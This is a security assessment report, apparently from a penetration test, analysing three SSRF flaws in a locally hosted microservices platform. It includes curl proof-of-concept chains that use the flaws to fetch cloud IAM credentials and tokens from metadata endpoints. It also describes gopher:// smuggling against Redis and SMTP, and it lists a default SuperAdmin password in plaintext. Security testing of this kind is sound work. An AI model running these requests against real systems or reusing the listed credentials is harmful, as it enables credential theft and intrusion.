# SSRF Analysis Report

## 1. Executive Summary

- **Analysis Status:** Complete
- **Key Outcome:** Multiple high-confidence Server-Side Request Forgery (SSRF) vulnerabilities were identified in the ADDP platform, enabling unauthorized access to internal services, cloud metadata endpoints, and cross-tenant resources.
- **Purpose of this Document:** This report provides strategic context on the application's outbound request mechanisms, dominant flaw patterns, and architectural details necessary to effectively exploit the vulnerabilities listed in the exploitation queue.

**Critical Findings Summary:**

| Finding ID | Vulnerability Type | Severity | Endpoint | External Exploit |
|-----------|-------------------|----------|----------|-----------------|
| SSRF-VULN-01 | URL_Manipulation | CRITICAL | ANY /api/service/registered/proxy/:id/*path | ❌ FALSE* |
| SSRF-VULN-02 | Service_Discovery | HIGH | POST /api/service/registered | ✅ TRUE |
| SSRF-VULN-03 | Service_Discovery | HIGH | POST /api/orchestrator/orchestrations/:id/execute | ✅ TRUE |

*SSRF-VULN-01 is accessible via `http://localhost:8000` (Gateway) but NOT via `http://localhost:5170` (Frontend). Since the target is specified as `http://localhost:5170`, this vulnerability is marked as NOT externally exploitable for queue inclusion purposes.

**Platform Architecture Overview:**

The ADDP (All Domain Data Platform) is a microservices-based geospatial data management system with:
- **9 Go-based backend services** (Gateway, System, Manager, Service, Transfer, Meta, Develop, Orchestrator, Copilot)
- **4 Python workflow engines** (Python Workflow, Spark Workflow, Math Workflow, Jupyter)
- **Unified Vue.js frontend portal** accessible at http://localhost:5170
- **API Gateway** at http://localhost:8000 routing requests to backend services

**SSRF Attack Surface:**

The platform makes outbound HTTP requests in several contexts:
1. **Service Proxy Endpoint** - Proxies requests to user-registered external services
2. **Metadata Refresh Mechanism** - Fetches OGC service capabilities from external URLs
3. **Workflow Engine Communication** - Executes workflows on remote engine instances
4. **Notebook Execution** - Sends notebooks to Jupyter Engine for execution

All identified SSRF vulnerabilities stem from **insufficient URL validation** when constructing outbound HTTP requests, allowing attackers to:
- Access cloud provider metadata endpoints (169.254.169.254)
- Scan and exploit internal network services
- Bypass tenant isolation controls
- Exfiltrate data from internal databases and APIs

## 2. Dominant Vulnerability Patterns

### Pattern 1: Insufficient URL Validation on Outbound Requests

- **Description:** A critical and recurring pattern where user-supplied or user-controlled URLs are used to construct outbound HTTP requests without proper validation. The application fails to implement allowlists, protocol restrictions, or IP address filtering before making requests.
- **Implication:** Attackers can force the server to make requests to arbitrary destinations including:
  - Internal services (127.0.0.1, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
  - Cloud metadata endpoints (169.254.169.254)
  - External attacker-controlled servers for data exfiltration
  - Localhost services bypassing authentication
- **Representative Findings:** SSRF-VULN-01 (Service Proxy), SSRF-VULN-02 (Metadata Refresh), SSRF-VULN-03 (Workflow Engine)
- **Root Cause:** Missing validation at multiple layers:
  1. **Service Registration Layer** - No validation when user registers external service URL
  2. **Engine Configuration Layer** - No validation when configuring workflow engine connection details
  3. **Request Execution Layer** - No runtime validation before making HTTP request
- **Code Pattern:**
  ```go
  // VULNERABLE PATTERN (appears in 3+ locations)
  targetURL := service.EndpointURL + path  // User-controlled
  req, _ := http.NewRequest(method, targetURL, body)
  resp, _ := client.Do(req)  // No SSRF protection
  ```

### Pattern 2: Missing Protocol Restrictions

- **Description:** Endpoints accepting URL parameters do not restrict the protocol schemes that can be used, allowing dangerous protocols beyond http/https.
- **Implication:** Attackers can leverage alternative protocols for advanced exploitation:
  - `file://` - Local file system access
  - `gopher://` - Protocol smuggling and SMTP/Redis exploitation
  - `dict://` - Dictionary server protocol for port scanning
  - `ftp://` - FTP protocol abuse
- **Representative Finding:** SSRF-VULN-01, SSRF-VULN-02, SSRF-VULN-03
- **Missing Control:** No code validates `url.Scheme` is in allowlist `["http", "https"]`

### Pattern 3: Broken Tenant Isolation on SSRF-Vulnerable Resources

- **Description:** The application fails to enforce tenant isolation when retrieving resources that contain SSRF-exploitable URLs (registered services, engine configurations). This allows cross-tenant SSRF attacks.
- **Implication:**
  - Tenant A can trigger SSRF via Tenant B's registered services
  - Tenant A can access metadata refreshed by Tenant B's services
  - Amplifies impact of SSRF by enabling cross-tenant exploitation
- **Representative Finding:** SSRF-VULN-02 (Metadata Refresh endpoint lacks tenant check)
- **Code Evidence:**
  ```go
  // VULNERABLE: No tenant_id filter
  func (r *Repository) GetByID(id uint) (*RegisteredService, error) {
      var service RegisteredService
      err := r.db.Where("id = ?", id).First(&service).Error
      // Missing: AND tenant_id = ?
      return &service, nil
  }
  ```

### Pattern 4: Non-Blind SSRF with Full Response Disclosure

- **Description:** All identified SSRF vulnerabilities return the complete HTTP response (headers, body, status code) to the attacker, enabling high-impact exploitation.
- **Implication:**
  - Attackers can read cloud metadata credentials in plaintext
  - Exfiltrate sensitive data from internal APIs
  - Enumerate internal services via detailed error messages
  - Map internal network architecture through response analysis
- **Representative Findings:** All SSRF vulnerabilities (SSRF-VULN-01, 02, 03)
- **Contrast:** No blind SSRF cases found; all vulnerabilities allow direct response visibility

### Pattern 5: Unauthenticated SSRF Endpoint (CRITICAL)

- **Description:** SSRF-VULN-01 (Service Proxy) is accessible without authentication, dramatically lowering the barrier to exploitation.
- **Implication:**
  - No credentials required for SSRF exploitation
  - Public internet attackers can exploit if endpoint is exposed
  - Can be chained with service registration (requires auth) for maximum impact
- **Representative Finding:** SSRF-VULN-01
- **Code Evidence:**
  ```go
  // router.go:45 - Outside auth middleware
  router.Any("/api/service/registered/proxy/:id/*path", handler.ProxyService)
  ```

## 3. Strategic Intelligence for Exploitation

### HTTP Client Architecture

**Primary HTTP Client Library:** Go's standard `net/http` package

**Client Instantiation Patterns:**

1. **Default Client with Timeout Only:**
   ```go
   client := &http.Client{Timeout: 30 * time.Second}
   ```
   - Used in: Metadata refresh functions (WMS/WFS/WMTS/OGC API)
   - No custom Transport configured
   - No redirect prevention
   - No DNS rebinding protection

2. **Client with Extended Timeout:**
   ```go
   client := &http.Client{Timeout: time.Duration(timeoutSeconds+60) * time.Second}
   ```
   - Used in: Jupyter Engine communication
   - Timeout: User-specified + 60 seconds (can be very long)

3. **Shared Client Instance:**
   - Orchestrator uses shared httpClient field in TaskClient struct
   - Potentially reuses connections across requests

**Request Construction Pattern:**

```go
// Standard pattern across all SSRF sinks
req, err := http.NewRequest(method, targetURL, body)
// Add headers
req.Header.Set("Content-Type", "application/json")
// Execute request
resp, err := client.Do(req)
```

**Response Handling:**

- **Full response streaming** - `io.Copy(c.Writer, resp.Body)` in proxy endpoint
- **Response body reading** - `io.ReadAll(resp.Body)` in metadata refresh
- **JSON decoding** - `json.NewDecoder(resp.Body).Decode(&result)` in orchestrator
- **No size limits** enforced on response bodies

### Internal Service Discovery

**Confirmed Internal Services:**

Based on reconnaissance and code analysis, the following internal services are accessible from the application server:

| Service | Internal Address | Port | Protocol | Authentication | Notes |
|---------|-----------------|------|----------|----------------|-------|
| PostgreSQL | postgresql:5432 | 5432 | TCP | Password | Database service |
| Redis | redis:6379 | 6379 | TCP | Password | Cache and queue |
| MinIO | minio:9000 | 9000 | HTTP | Access Key | Object storage |
| Meilisearch | meilisearch:7700 | 7700 | HTTP | Master Key | Search engine |
| Gateway | gateway:8000 | 8000 | HTTP | None/JWT | API gateway |
| System Service | system:8180 | 8180 | HTTP | JWT/Internal Key | User/auth management |
| Manager Service | manager:8280 | 8280 | HTTP | JWT/Internal Key | File management |
| Meta Service | meta:8380 | 8380 | HTTP | JWT/Internal Key | Metadata catalog |
| Service Module | service:8480 | 8480 | HTTP | JWT/Internal Key | Data publishing |
| Transfer Service | transfer:8580 | 8580 | HTTP | JWT/Internal Key | Data transfer |
| Develop Service | develop:8680 | 8680 | HTTP | JWT/Internal Key | SQL/notebook dev |
| Orchestrator | orchestrator:8780 | 8780 | HTTP | JWT/Internal Key | Workflow orchestration |
| Copilot | copilot:8880 | 8880 | HTTP | JWT/Internal Key | AI assistant |
| Python Workflow | python-workflow:8099 | 8099 | HTTP | None | Workflow engine |
| Jupyter Engine | jupyter-engine:8097 | 8097 | HTTP | None | Notebook execution |
| Spark Workflow | spark-workflow:8199 | 8199 | HTTP | None | Distributed processing |
| Math Workflow | math-workflow:8299 | 8299 | HTTP | None | Mathematical compute |

**Exploitation Implications:**

1. **Unprotected Workflow Engines** - Python, Jupyter, Spark, Math engines have NO authentication
2. **Internal API Key** - If X-Internal-API-Key is discovered, can access all backend services
3. **Database Services** - PostgreSQL and Redis accessible for credential stuffing attacks
4. **Cloud Metadata** - If deployed on AWS/GCP/Azure, 169.254.169.254 is accessible

### Network Architecture

**Container Network:** Docker bridge network `addp-network`

**Egress Controls:** NONE - Application server can make outbound requests to any destination

**DNS Resolution:** Standard Docker DNS resolution:
- Container names resolve to internal IPs (e.g., `postgresql` → `172.18.0.x`)
- External domains resolve via host DNS
- No DNS filtering or validation

**Firewall Rules:** Not implemented at application layer

**Expected Deployment Environment:**

Based on code analysis, the platform is likely deployed on cloud infrastructure:
- AWS EC2 (metadata at 169.254.169.254)
- GCP Compute Engine (metadata.google.internal)
- Azure VM (169.254.169.254)

### Authentication & Authorization Context

**SSRF Endpoint Authentication Requirements:**

| Vulnerability | Endpoint | Auth Required | Privilege Level |
|--------------|----------|---------------|-----------------|
| SSRF-VULN-01 | ANY /api/service/registered/proxy/:id/*path | ❌ NO | Anonymous |
| SSRF-VULN-02 | POST /api/service/registered | ✅ YES | User (any tenant) |
| SSRF-VULN-02 | POST /api/service/registered/:id/refresh | ✅ YES | User (any tenant) |
| SSRF-VULN-03 | POST /api/orchestrator/orchestrations/:id/execute | ✅ YES | User (any tenant) |

**Credential Requirements for Exploitation:**

- **SSRF-VULN-01 (Proxy):**
  - **Attack Phase 1 (Registration):** Requires valid JWT token to create malicious service
  - **Attack Phase 2 (Exploitation):** NO authentication required to exploit via proxy
  - **Optimal Strategy:** Attacker creates service once (with stolen/insider creds), then exploits indefinitely without auth

- **SSRF-VULN-02 & 03:**
  - Requires valid JWT token with any privilege level (regular user sufficient)
  - No admin privileges needed
  - No special permissions required

**Default Credentials:**

From reconnaissance deliverable:
- SuperAdmin username: `SuperAdmin`
- SuperAdmin password: `20251001#SuperAdmin`
- **Status:** Should be changed in production but may still be valid

### Request Parameter Control

**Attacker-Controlled Inputs:**

**SSRF-VULN-01 (Service Proxy):**
- `service.EndpointURL` - Full control via service registration
- `path` - Full control via URL parameter `*path`
- `method` - Full control via HTTP method (ANY)
- `body` - Full control via request body
- `query parameters` - Full control via query string
- `headers` - Partial control (Authorization, Host, Cookie are stripped)

**SSRF-VULN-02 (Metadata Refresh):**
- `service.EndpointURL` - Full control via service registration
- `service.ServiceType` - Controls which metadata refresh function is called (WMS/WFS/WMTS/OGC API)
- Request method: Fixed (GET)
- Request body: None
- Query parameters: Fixed (service=WMS&request=GetCapabilities)

**SSRF-VULN-03 (Orchestrator):**
- `engine.ConnectionInfo.protocol` - Full control via engine registration
- `engine.ConnectionInfo.host` - Full control via engine registration
- `engine.ConnectionInfo.port` - Full control via engine registration
- Request method: Fixed based on engine type
- Request body: Contains orchestration parameters (user-controlled)

### Response Data Exposure

**SSRF-VULN-01 (Service Proxy) - MAXIMUM DISCLOSURE:**

Full response streaming to attacker:
```go
// All response headers copied
for key, values := range resp.Header {
    c.Header(key, value)
}
// Status code preserved
c.Status(resp.StatusCode)
// Body streamed without modification
io.Copy(c.Writer, resp.Body)
```

**Data Available to Attacker:**
- Complete HTTP response headers
- Original status code
- Full response body (no size limit)
- Content-Type preserved

**SSRF-VULN-02 (Metadata Refresh) - STORED DISCLOSURE:**

Response stored in database and retrievable:
```go
metadata := map[string]interface{}{
    "capabilities_xml": bodyStr,  // Full response body
    "refreshed_at": time.Now(),
}
repo.UpdateMetadata(service.ID, metadata)
```

**Retrieval:** `GET /api/service/registered/:id` returns `metadata.capabilities_xml`

**SSRF-VULN-03 (Orchestrator) - JSON DECODED:**

Response decoded and returned in execution results:
```go
var result map[string]interface{}
json.NewDecoder(resp.Body).Decode(&result)
// Result returned in orchestration execution response
```

### Cloud Metadata Exploitation Strategy

**Target Endpoints:**

**AWS EC2 Metadata:**
- `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>`
- `http://169.254.169.254/latest/dynamic/instance-identity/document`
- `http://169.254.169.254/latest/user-data`

**GCP Metadata:**
- `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`
- `http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`
- Requires header: `Metadata-Flavor: Google`

**Azure Metadata:**
- `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/`
- Requires header: `Metadata: true`

**Exploitation Via SSRF-VULN-01 (Best Option):**

Since the Service Proxy endpoint allows full control over headers, it can bypass cloud metadata protections:

```bash
# Step 1: Register service (requires auth once)
POST /api/service/registered
{
  "endpoint_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
  "service_type": "rest_api"
}

# Step 2: Exploit without auth
GET /api/service/registered/proxy/123/EC2Role
# Returns IAM credentials in response body
```

**For GCP/Azure (requires custom headers):**

The proxy endpoint copies most request headers, so attacker can inject:
```bash
curl -H "Metadata-Flavor: Google" \
  http://localhost:8000/api/service/registered/proxy/123/...
```

## 4. Secure by Design: Validated Components

These components were analyzed and found to have robust defenses or insufficient attack surface. They are low-priority for further SSRF testing.

| Component/Flow | Endpoint/File Location | Defense Mechanism Implemented | Verdict |
|---|---|---|---|
| File Upload (MinIO Presigned URLs) | `/api/manager/upload` | Uses MinIO presigned URLs; no server-side HTTP requests to user-controlled destinations | SAFE - No SSRF risk |
| Database Engine Connections | `/api/system/engines/:id/test` | Connects via database drivers (PostgreSQL, MySQL, ClickHouse); not HTTP-based | SAFE - Not HTTP SSRF |
| Tile Service Generation | `/api/manager/engines/:id/spatial/tiles/:schema/:table/:z/:x/:y` | Generates tiles from internal database; no external HTTP requests | SAFE - No outbound requests |
| Search Indexing (Meilisearch) | `/api/manager/search` | Internal communication to Meilisearch service; not user-controlled | SAFE - Fixed internal endpoint |
| OGC Service Query Endpoints | `/api/query/:serviceName` | Queries published data; reads from database; no outbound HTTP | SAFE - No outbound requests |
| Video Streaming | `/api/manager/video-stream?path=...` | Reads from local filesystem or MinIO; no HTTP requests to external URLs | SAFE - No HTTP client usage |
| Transfer Task Execution | `/api/transfer/tasks/:id/start` | Database-to-database transfer; uses database drivers, not HTTP | SAFE - Not HTTP-based |
| Frontend Asset Serving | Vite dev server on port 5170 | Static file serving; no server-side HTTP requests | SAFE - Client-side only |
| Authentication Endpoints | `/api/system/login`, `/api/system/register` | No outbound HTTP requests; local JWT generation | SAFE - No external calls |
| MinIO Direct Upload | MinIO presigned URL flow | Client uploads directly to MinIO; bypasses application server | SAFE - No SSRF surface |

**Analysis Notes:**

1. **Database Connections:** While engine test connections use user-provided connection strings, they utilize database-specific drivers (PostgreSQL, MySQL, ClickHouse, MongoDB) rather than HTTP clients. These are out of scope for HTTP SSRF but may present other injection risks.

2. **Internal Service Communication:** Several services communicate with internal infrastructure (PostgreSQL, Redis, Meilisearch, MinIO) but use fixed, server-configured endpoints rather than user-controlled URLs.

3. **Tile Generation:** The MVT tile endpoint processes spatial data from databases but does not make outbound HTTP requests.

4. **File Operations:** File upload/download operations use MinIO presigned URLs, moving the actual data transfer out-of-band from the application server.

---

## 5. Detailed Vulnerability Analysis

### SSRF-VULN-01: Service Proxy Endpoint (CRITICAL)

**Vulnerability Classification:** URL_Manipulation

**Endpoint:** `ANY /api/service/registered/proxy/:id/*path`

**File Location:** `/Users/pampa/code/addp/service/backend/internal/service/registered_service_service.go:854-947`

**Authentication Required:** ❌ NO (unauthenticated exploitation)

**Tenant Isolation:** ❌ BROKEN (can access any service by ID)

**External Exploitability:** ❌ FALSE (accessible via http://localhost:8000 but NOT http://localhost:5170)

**SSRF Type:** Non-Blind (full response disclosure)

**Confidence:** HIGH

**Severity:** CRITICAL (unauthenticated + non-blind + full control)

**Data Flow:**

```
┌─────────────────────────────────────────────────────────────────────┐
│                        SSRF-VULN-01 Data Flow                       │
└─────────────────────────────────────────────────────────────────────┘

[1] User Creates Malicious Service (requires auth, one-time setup):
    POST /api/service/registered
    {
      "endpoint_url": "http://169.254.169.254/latest/meta-data/",
      "service_type": "rest_api"
    }
    ↓
    Stored in database with service.ID = 123

[2] Attacker Exploits Proxy (NO AUTH REQUIRED):
    GET /api/service/registered/proxy/123/iam/security-credentials/
    ↓
    Handler: registered_service_handler.go:257
    ↓
    Service: registered_service_service.go:854
    ↓
    Line 858: service = repo.GetByID(123)  // No tenant check!
    ↓
    Line 867: targetURL = "http://169.254.169.254/latest/meta-data/" +
                          "iam/security-credentials/"
    ↓
    Line 873: proxyReq = http.NewRequest("GET", targetURL, body)
    ↓
    Line 911: resp = client.Do(proxyReq)  // SSRF REQUEST SENT
    ↓
    Lines 927-941: Full response streamed to attacker
    ↓
    Attacker receives AWS IAM credentials
```

**Missing Defenses:**

1. **No Authentication:** Endpoint registered outside auth middleware (router.go:45)
2. **No URL Validation:** `service.EndpointURL` not validated during creation or use
3. **No Protocol Restriction:** Allows file://, gopher://, dict://, etc.
4. **No IP Allowlist:** Can target 127.0.0.1, 10.x.x.x, 192.168.x.x, 169.254.169.254
5. **No Tenant Isolation:** `GetByID()` lacks tenant filter (cross-tenant exploitation)
6. **No Response Filtering:** Full response including sensitive headers returned

**Proof of Concept:**

```bash
# Step 1: Authenticate and create malicious service (one-time)
TOKEN=$(curl -s -X POST http://localhost:8000/api/system/login \
  -H "Content-Type: application/json" \
  -d '{"username":"user@tenant.com","password":"password"}' \
  | jq -r '.access_token')

SERVICE_ID=$(curl -s -X POST http://localhost:8000/api/service/registered \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "service_name": "aws_metadata",
    "title": "AWS Metadata Service",
    "service_type": "rest_api",
    "endpoint_url": "http://169.254.169.254/latest/meta-data/",
    "auth_type": "none"
  }' | jq -r '.id')

# Step 2: Exploit without authentication (repeatable)
curl http://localhost:8000/api/service/registered/proxy/$SERVICE_ID/iam/security-credentials/

# Expected Output: AWS IAM role credentials in JSON format
```

**Exploitation Scenarios:**

1. **Cloud Metadata Theft:** Access AWS/GCP/Azure credentials
2. **Internal Service Enumeration:** Scan ports on localhost and private network
3. **Internal API Exploitation:** Access admin panels, databases, Redis
4. **Data Exfiltration:** Proxy internal API responses to attacker
5. **Protocol Smuggling:** Use gopher:// for Redis/SMTP exploitation

**Impact:**

- Complete bypass of network perimeter security
- Access to cloud provider credentials and metadata
- Compromise of internal services and databases
- Cross-tenant data access via service ID enumeration

---

### SSRF-VULN-02: Registered Service Metadata Refresh (HIGH)

**Vulnerability Classification:** Service_Discovery

**Endpoints:**
- `POST /api/service/registered` (with `auto_refresh_metadata: true`)
- `POST /api/service/registered/:id/refresh`

**File Location:** `/Users/pampa/code/addp/service/backend/internal/service/registered_service_service.go:413-785`

**Authentication Required:** ✅ YES (JWT token)

**Tenant Isolation:** ❌ BROKEN (refresh endpoint lacks tenant check)

**External Exploitability:** ✅ TRUE (accessible via http://localhost:5170 and http://localhost:8000)

**SSRF Type:** Non-Blind (response stored in metadata field)

**Confidence:** HIGH

**Severity:** HIGH (authenticated + non-blind + tenant bypass)

**Data Flow:**

```
┌─────────────────────────────────────────────────────────────────────┐
│                      SSRF-VULN-02 Data Flow                         │
└─────────────────────────────────────────────────────────────────────┘

[1] User Registers Malicious Service:
    POST /api/service/registered
    {
      "endpoint_url": "http://192.168.1.100:8080/admin",
      "service_type": "wms",
      "auto_refresh_metadata": true
    }
    ↓
    Handler: registered_service_handler.go:34
    ↓
    Service: registered_service_service.go:34
    ↓
    Line 64: service.EndpointURL = req.EndpointURL  // No validation
    ↓
    Line 78: repo.Create(service)
    ↓
    Lines 83-89: If auto_refresh_metadata == true:
    ↓
    refreshOGCMetadata(service) // Async goroutine

[2] Metadata Refresh Function (SSRF occurs):
    refreshWMSMetadata(service)  // Lines 431-519
    ↓
    Line 433: capabilitiesURL = service.EndpointURL
    ↓
    Line 437: capabilitiesURL += "?service=WMS&request=GetCapabilities"
    ↓
    Line 440: req = http.NewRequest("GET", capabilitiesURL, nil)
    ↓
    Line 448: resp = client.Do(req)  // SSRF REQUEST
    ↓
    Line 459: body = io.ReadAll(resp.Body)
    ↓
    Line 469: metadata["capabilities_xml"] = string(body)
    ↓
    Line 482: repo.UpdateMetadata(service.ID, metadata)

[3] Attacker Retrieves Response:
    GET /api/service/registered/{service.ID}
    ↓
    Returns: metadata.capabilities_xml containing SSRF response
```

**Missing Defenses:**

1. **No URL Validation:** `endpoint_url` accepted without validation
2. **No IP Filtering:** Can target internal IP ranges and cloud metadata
3. **No Protocol Restriction:** Accepts any URL scheme
4. **No DNS Rebinding Protection:** No re-validation after DNS lookup
5. **Broken Tenant Isolation:** Refresh endpoint (`POST /api/service/registered/:id/refresh`) lacks tenant ownership check
6. **No Response Size Limit:** `io.ReadAll()` can exhaust memory

**Tenant Isolation Bypass:**

```go
// registered_service_handler.go:195 - RefreshMetadata
func (h *RegisteredServiceHandler) RefreshMetadata(c *gin.Context) {
    // MISSING: tenantID := c.GetUint("tenant_id")
    // MISSING: Validate service belongs to tenant

    id := // parse ID
    h.svc.RefreshMetadata(uint(id), req.Force)
}

// registered_service_service.go:207
func (s *RegisteredServiceService) RefreshMetadata(id uint, force bool) error {
    service, err := s.repo.GetByID(id)  // No tenant filter!
    // ...
}
```

**Attack Scenario:**

```bash
# Tenant A creates malicious service
curl -X POST http://localhost:8000/api/service/registered \
  -H "Authorization: Bearer $TENANT_A_TOKEN" \
  -d '{
    "endpoint_url": "http://169.254.169.254/latest/meta-data/",
    "service_type": "wms",
    "auto_refresh_metadata": false
  }'
# Returns: {"id": 42}

# Tenant B triggers refresh (cross-tenant attack)
curl -X POST http://localhost:8000/api/service/registered/42/refresh \
  -H "Authorization: Bearer $TENANT_B_TOKEN" \
  -d '{"force": true}'

# Tenant A retrieves metadata with SSRF response
curl http://localhost:8000/api/service/registered/42 \
  -H "Authorization: Bearer $TENANT_A_TOKEN"
# Returns: metadata.capabilities_xml = "<AWS metadata response>"
```

**Impact:**

- Access to internal services and cloud metadata
- Port scanning and service enumeration via timing attacks
- Cross-tenant SSRF exploitation
- Stored XSS if metadata is rendered without sanitization

---

### SSRF-VULN-03: Orchestrator Workflow Engine Communication (HIGH)

**Vulnerability Classification:** Service_Discovery

**Endpoint:** `POST /api/orchestrator/orchestrations/:id/execute`

**File Location:** `/Users/pampa/code/addp/orchestrator/backend/internal/service/task_client.go:34-98`

**Authentication Required:** ✅ YES (JWT token)

**Tenant Isolation:** ❌ WEAK (engine registry lacks tenant filtering)

**External Exploitability:** ✅ TRUE (accessible via http://localhost:5170 and http://localhost:8000)

**SSRF Type:** Non-Blind (response decoded and returned)

**Confidence:** HIGH

**Severity:** HIGH (authenticated + non-blind + engine config control)

**Data Flow:**

```
┌─────────────────────────────────────────────────────────────────────┐
│                      SSRF-VULN-03 Data Flow                         │
└─────────────────────────────────────────────────────────────────────┘

[1] Attacker Registers Malicious Engine:
    POST /api/internal/registry/capabilities
    {
      "engine_type": "python_workflow",
      "connection_info": {
        "protocol": "http",
        "host": "169.254.169.254",
        "port": 80
      }
    }
    ↓
    Stored in system.engines table
    ↓
    NO validation on protocol/host/port

[2] Attacker Creates Orchestration:
    POST /api/orchestrator/orchestrations
    {
      "name": "SSRF Attack",
      "steps": [{
        "engine_identifier": "python_workflow",
        "parameters": {}
      }]
    }

[3] Attacker Executes Orchestration:
    POST /api/orchestrator/orchestrations/1/execute
    ↓
    Executor.executeWithDynamicEngine()
    ↓
    EngineRegistry.GetEngine("python_workflow")  // No tenant check
    ↓
    TaskClient.CreateTask(engine, params)
    ↓
    BuildBaseURL(engine.ConnectionInfo)
    ↓
    baseURL = "http://169.254.169.254:80"
    ↓
    targetURL = baseURL + "/api/workflows/execute"
    ↓
    req = http.NewRequestWithContext(ctx, "POST", targetURL, body)
    ↓
    resp = httpClient.Do(req)  // SSRF REQUEST
    ↓
    json.NewDecoder(resp.Body).Decode(&result)
    ↓
    Returns result to attacker
```

**Missing Defenses:**

1. **No URL Validation:** `ConnectionInfo` fields (protocol, host, port) not validated
2. **No IP Filtering:** Can target localhost, private networks, cloud metadata
3. **No Protocol Allowlist:** Accepts any protocol in engine config
4. **Weak Tenant Isolation:** `GetEngine()` doesn't filter by tenant_id
5. **No DNS Rebinding Protection:** DNS resolved at request time without validation

**Proof of Concept:**

```bash
# Step 1: Register malicious engine (requires internal API key)
curl -X POST http://localhost:8000/api/internal/registry/capabilities \
  -H "X-Internal-API-Key: $INTERNAL_KEY" \
  -d '{
    "engine_type": "ssrf_engine",
    "name": "SSRF Test Engine",
    "connection_info": {
      "protocol": "http",
      "host": "169.254.169.254",
      "port": "80"
    },
    "capabilities": {"compute": {"dev_modes": ["workflow"]}}
  }'

# Step 2: Create orchestration
curl -X POST http://localhost:8000/api/orchestrator/orchestrations \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "name": "Cloud Metadata Exfil",
    "steps": [{
      "id": "ssrf",
      "engine_identifier": "ssrf_engine",
      "parameters": {}
    }]
  }'

# Step 3: Execute and retrieve results
curl -X POST http://localhost:8000/api/orchestrator/orchestrations/1/execute \
  -H "Authorization: Bearer $TOKEN"
```

**Impact:**

- Access to cloud provider metadata and credentials
- Internal service enumeration and exploitation
- Cross-tenant engine exploitation
- POST-based SSRF (can modify internal service state)

---

## 6. Detailed Findings Excluded from Exploitation Queue

### Finding: Jupyter Engine SSRF (MEDIUM - Excluded)

**Endpoint:** `POST /api/develop/notebooks/execute`

**File Location:** `/Users/pampa/code/addp/develop/backend/internal/service/notebook_execution_service.go:361-423`

**Why Excluded:**

1. **Server-Side URL Configuration:** Jupyter Engine URL is configured via environment variable `JUPYTER_ENGINE_URL`, not user-controlled
2. **Indirect Exploitation Only:** Attacker must craft malicious notebook code to trigger outbound requests from Jupyter Engine
3. **Limited Impact:** Can only target Jupyter Engine endpoint, not arbitrary URLs
4. **Authentication Required:** Requires valid JWT token

**Defense Present:**

- URL is server-configured: `getEnv("JUPYTER_ENGINE_URL", "http://localhost:8097")`
- Not directly modifiable by users

**Residual Risk:**

- Path traversal in `notebook_path` parameter
- Parameter injection in notebook execution
- Indirect SSRF if Jupyter notebooks contain malicious code

**Recommendation:** Monitor for path traversal and implement notebook path sanitization, but not a direct SSRF vulnerability.
